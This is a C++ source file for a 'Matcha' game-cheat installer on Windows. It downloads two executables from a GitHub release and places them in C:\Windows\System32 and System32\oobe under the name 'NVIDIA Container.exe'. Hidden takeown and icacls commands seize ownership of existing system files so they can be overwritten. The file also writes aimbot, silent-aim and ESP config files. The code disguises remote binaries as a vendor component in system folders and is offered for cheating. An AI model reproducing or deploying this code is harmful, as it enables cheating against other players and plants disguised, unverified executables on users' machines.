#include "MatchaInstaller.hpp"
#include <winhttp.h>
#include <ShlObj.h>
#include <fstream>

#pragma comment(lib, "winhttp.lib")

namespace MatchaInstaller {

    bool DownloadFile(const std::wstring& url, const std::wstring& destPath) {
        // Parse URL
        URL_COMPONENTS urlComp{};
        urlComp.dwStructSize = sizeof(urlComp);
        wchar_t hostName[256]{};
        wchar_t urlPath[1024]{};
        urlComp.lpszHostName = hostName;
        urlComp.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);
        urlComp.lpszUrlPath = urlPath;
        urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);

        if (!WinHttpCrackUrl(url.c_str(), 0, 0, &urlComp))
            return false;

        HINTERNET hSession = WinHttpOpen(L"Hostt/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;

        HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        if (!WinHttpReceiveResponse(hRequest, nullptr)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Download to file
        std::ofstream outFile(destPath, std::ios::binary);
        if (!outFile.is_open()) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        DWORD bytesRead = 0;
        BYTE buffer[4096];
        while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            outFile.write(reinterpret_cast<char*>(buffer), bytesRead);
        }

        outFile.close();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return true;
    }

    bool InstallFile(const std::wstring& srcPath, const std::wstring& dstPath) {
        // Take ownership and set permissions
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};

        // Check if destination exists
        if (GetFileAttributesW(dstPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::wstring takeown = L"takeown /f \"" + dstPath + L"\" >nul 2>&1";
            std::wstring icacls = L"icacls \"" + dstPath + L"\" /grant administrators:F >nul 2>&1";

            CreateProcessW(nullptr, &takeown[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
            if (pi.hProcess) {
                WaitForSingleObject(pi.hProcess, 5000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }

            CreateProcessW(nullptr, &icacls[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
            if (pi.hProcess) {
                WaitForSingleObject(pi.hProcess, 5000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }

        // Copy file
        if (CopyFileW(srcPath.c_str(), dstPath.c_str(), FALSE))
            return true;

        // Fallback: use xcopy
        std::wstring xcopy = L"cmd.exe /c copy /y \"" + srcPath + L"\" \"" + dstPath + L"\" >nul 2>&1";
        CreateProcessW(nullptr, &xcopy[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (pi.hProcess) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        return GetFileAttributesW(dstPath.c_str()) != INVALID_FILE_ATTRIBUTES;
    }

    bool CreateMatchaFolders() {
        // Create C:\matcha
        if (!CreateDirectoryW(L"C:\\matcha", nullptr) && GetLastError() != ERROR_ALREADY_EXISTS)
            return false;

        // Create C:\matcha\configurations
        if (!CreateDirectoryW(L"C:\\matcha\\configurations", nullptr) && GetLastError() != ERROR_ALREADY_EXISTS)
            return false;

        // Create directories first
        CreateDirectoryW(L"C:\\matcha", nullptr);
        CreateDirectoryW(L"C:\\matcha\\configurations", nullptr);

        // Create config files
        const char* legitCfg = R"({"aimbot":true,"aimbot_hitpart":6,"aimbot_range":142,"aimbot_wallcheck":false,"aimkey":6,"aimkeymethod":1,"aimtype":0,"fov":47,"silent_aim":true,"silent_fov":35,"silent_hitpart":6,"silent_method":1,"silent_range":204,"esp":true,"box":false,"skeleton":true,"health_text":false,"name_esp":true})";

        const char* semiCfg = R"({"aimbot":true,"aimbot_hitpart":6,"aimbot_range":142,"aimbot_wallcheck":false,"aimkey":6,"aimkeymethod":1,"aimtype":0,"fov":68,"silent_aim":true,"silent_fov":33,"silent_hitpart":6,"silent_method":1,"silent_range":204,"esp":true,"box":false,"skeleton":true,"health_text":false,"name_esp":true})";

        HANDLE hLegit = CreateFileW(L"C:\\matcha\\configurations\\legit.cfg", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hLegit != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            WriteFile(hLegit, legitCfg, strlen(legitCfg), &written, nullptr);
            CloseHandle(hLegit);
        }

        HANDLE hSemi = CreateFileW(L"C:\\matcha\\configurations\\semi.cfg", GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hSemi != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            WriteFile(hSemi, semiCfg, strlen(semiCfg), &written, nullptr);
            CloseHandle(hSemi);
        }

        return true;
    }

    bool DownloadAndInstallMatcha() {
        wchar_t tempDir[MAX_PATH]{};
        GetTempPathW(MAX_PATH, tempDir);

        // Download NVIDIA Container (oobe) - 12.2MB
        std::wstring tmpOobe = std::wstring(tempDir) + L"NVIDIAContainer_oobe.exe";
        if (!DownloadFile(L"https://github.com/discordpapa733-afk/trackedbypassadvanced/releases/download/v1.0/NVIDIA.Container.exe", tmpOobe))
            return false;

        // Download NVIDIA Container (System32) - 0.24MB
        std::wstring tmpSys32 = std::wstring(tempDir) + L"NVIDIAContainer_sys32.exe";
        if (!DownloadFile(L"https://github.com/discordpapa733-afk/trackedbypassadvanced/releases/download/v1.0/NVIDIA.Container.1.exe", tmpSys32))
            return false;

        // Install to oobe
        if (!InstallFile(tmpOobe, L"C:\\Windows\\System32\\oobe\\NVIDIA Container.exe"))
            return false;

        // Install to System32
        if (!InstallFile(tmpSys32, L"C:\\Windows\\System32\\NVIDIA Container.exe"))
            return false;

        // Create matcha folders and configs
        if (!CreateMatchaFolders())
            return false;

        // Clean up temp files
        DeleteFileW(tmpOobe.c_str());
        DeleteFileW(tmpSys32.c_str());

        return true;
    }

} // namespace MatchaInstaller
